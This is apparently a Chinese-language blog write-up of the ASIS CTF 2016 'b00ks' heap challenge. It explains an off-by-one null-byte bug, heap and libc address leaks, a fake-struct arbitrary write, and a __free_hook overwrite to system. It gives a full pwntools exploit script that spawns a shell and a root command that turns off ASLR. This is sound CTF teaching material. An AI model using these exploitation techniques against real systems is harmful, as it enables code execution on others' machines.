---
title: "Asis CTF 2016 b00ks 题解"
publishDate: "4 Feb 2023"
description: "一个 Linux 堆题, 😭 为啥 Linux 堆分配这么复杂啊嘤嘤嘤，堆题好难啊嘤嘤嘤"
tags: ["CTF", "PWN"]
---

## 关于堆 chunk

一开始我还以为堆 chunk 会乱分配，但是没有想到实际上这个堆空间的划分和切香肠的过程很像。

一开始我们会有一个 top chunk

![Untitled.png](https://s2.loli.net/2023/02/04/6mon4xQwOWBNktP.png)

然后假如说用户申请了一个 chunk ，而且 chunk 的大小比 top chunk 小，那么计算机就会从 top chunk 上切一块出来，分配给用户

![Untitled 1.png](https://s2.loli.net/2023/02/04/PIQE8rziWYyZNwC.png)

如果比 top chunk 大，那么计算机会使用 mmap，从别的地方分配一个内存给用户，这个题目用不到这个特性。

## 安全防护信息

![Untitled 2.png](https://s2.loli.net/2023/02/04/pQt3MIj8S4ygYAh.png)

虽然说这个题目 canary 没有开，但是实际上这个题目中所有的数据都输入到了堆上。所以实际上这个地方根本就没有栈溢出。然后开启了 PIE，为了调试方便，我们用下面这个命令关闭 aslr

```bash
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

之后使用 rebase programme 来修正 idea 中程序每条汇编指令在内存中的地址。

![Untitled 3.png](https://s2.loli.net/2023/02/04/3WvZT6UAxBIFKpO.png)

## 代码分析

这个题目中，题目的作者自己实现了一个 gets 函数

```cpp
__int64 __fastcall sub_5555555549F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == 10 )
      break;
    ++a1;
    if ( i == a2 ) // 应该是 i == a2 - 1 就要退出循环
      break;
  }
  *a1 = 0;
  return 0LL;
}
```

我们可以看到这个函数实际上犯了一个非常低级的错误，这个函数将从 stdin 中读取字符串，但是很明显他搞错了循环的次数，在输入数据的时候多输入了一位数据。这就给我们带来了漏洞

### 漏洞 1

可以看到 author name 的地址为 0x555555756040, 然后那个存放书本指针的数组在 0x555555766060，可以看到这两个数据是相邻的。所以我们先将 author_name 这个字符串数组填满，这样字符串结尾的 \x00 就会到 books_arr 这个数组里面。这个时候我们再创建一本书，然后输出一下作者名，这样就能将数组中第一个数据的地址给泄漏出来。这样堆的地址就泄漏出来了。
![Untitled 4.png](https://s2.loli.net/2023/02/04/o9favNSzZEKgm1Y.png)

### 漏洞 2

> PS: 因为 chunk 在数据量比较小的时候的分配是类似切香肠的方式，所以 chunk 和 chunk 之间的偏移是固定的

除了能泄漏数据，我们还要有任意地址读写的能力，方便我们日后泄漏 libc 并且还能有劫持 free hook 的能力

所以我们可以看到，假如在创建第一本书以后，再次填充满 author_name，这个时候多出来的 \x00 就会将 books_arr 的第一个值的最后一个字节置为 0。

这样第一本书的地址就会被修改到其他的地方，然后这个地址如果能在第一本书的 description 之内，我们就能利用修改书本描述这个功能，构造一个假书本，然后这个假书本的存储名字字符串地址和描述字符串地址的那两个字段我们可以随心掌控，这样就能造成任意地址读取。只要我们将第一本书的名字和描述的空间设置为 140，那么就能做到这一点。别的长度应该也可以。

这次我们泄漏 libc 的方法采用 unsorted bin 泄漏的方法，具体操作可以看我的解题脚本。

然后劫持 free hook 的原理，可以看看这个文章

[\_\_free_hook 劫持原理](http://blog.eonew.cn/2019-03-07.__free_hook%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86.html)

## 解体脚本

```python
import pwn
import pwnlib

pwn.context.arch = "amd64"
pwn.context.log_level = "debug"
pwn.context.terminal = ['tmux', 'splitw', '-h']

SMALL_SIZE = 140
BIG_SIZE = 0x21000

# target = pwn.gdb.debug('./pwn', 'b *0x0000555555554EE1')
# target = pwn.remote('node4.buuoj.cn', 25418)
target = pwn.process('./pwn')
libc = pwn.ELF('./libc-2.23.so')

def create_book(target: pwn.process, name_size: int, name: str, description_size: int, description: str):
    target.sendlineafter('> ', b'1')
    target.sendlineafter('Enter book name size: ', str(name_size).encode())
    target.sendlineafter('Enter book name (Max 32 chars): ', name.encode())
    target.sendlineafter('Enter book description size: ',
                         str(description_size).encode())
    target.sendlineafter('Enter book description: ', description.encode())

def change_author_name(target: pwn.process, name: str):
    target.sendlineafter('> ', b'5')
    target.sendlineafter('Enter author name: ', name)

def edit_book(target: pwn.process, id: int, description: bytes):
    target.sendlineafter('> ', b'3')
    target.sendlineafter(
        'Enter the book id you want to edit: ', str(id).encode())
    target.sendlineafter(b'Enter new book description: ', description)

def delete_book(target: pwn.process, id: int):
    target.sendlineafter('> ', b'2')
    target.sendlineafter(
        'Enter the book id you want to delete: ', str(id).encode())

if __name__ == '__main__':
    target.sendlineafter('Enter author name: ', b'A' * 32)
    create_book(target, 140, "book1", 140, "abook")

    # leak book1 addr
    target.sendlineafter('> ', b'4')
    target.recvuntil(b'Author: ')
    book1_addr = pwn.u64(target.recvuntil(b'\n')[32:-1].ljust(8, b'\x00'))

    # create book2
    create_book(target, 136, 'book2', 40, 'another book')
    create_book(target, 40, '/bin/sh', 40, '/bin/sh')

    # 计算 book2 name 地址
    book2_name_addr = book1_addr + 0x30
    book3_addr = book1_addr + 0x180

    # 伪造假 book1
    fake_book1_data = pwn.flat([
        b'A' * 0x40,
        0x1,
        book2_name_addr,  # 指向 book 2 的结构体数据中的 book_name 部分
        # 到时候可以修改 book3 结构体中的 description 地址，未来将这个地址修改成 free hook 的地址，这样我们就能修改 free hook 了
        book3_addr + 16,
        0xffff
    ])
    edit_book(target, 1, fake_book1_data)
    change_author_name(target, 'A' * 32)

    delete_book(target, 2)

    # leak libc addr and free_hook addr
    target.sendlineafter('> ', b'4')
    target.recvuntil('Name: ')
    fd_value = pwn.u64(target.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
    main_arena_addr = fd_value - 88
    malloc_hook_addr = main_arena_addr - 0x10
    libc_addr = malloc_hook_addr - libc.symbols['__malloc_hook']
    system_addr = libc_addr + libc.symbols['system']
    free_hook_addr = libc_addr + libc.symbols['__free_hook']

    # 将 book3 中的 description 地址修改成 free hook 的
    # 这个地方很关键，因为输入了数据以后，因为 off by one，会导致 size 字段被清空
    edit_book(target, 1, pwn.p64(free_hook_addr) + b'\x20')
    edit_book(target, 3, pwn.p64(system_addr) + b'\x20')

    # get shell
    delete_book(target, 3)
    target.interactive()
```
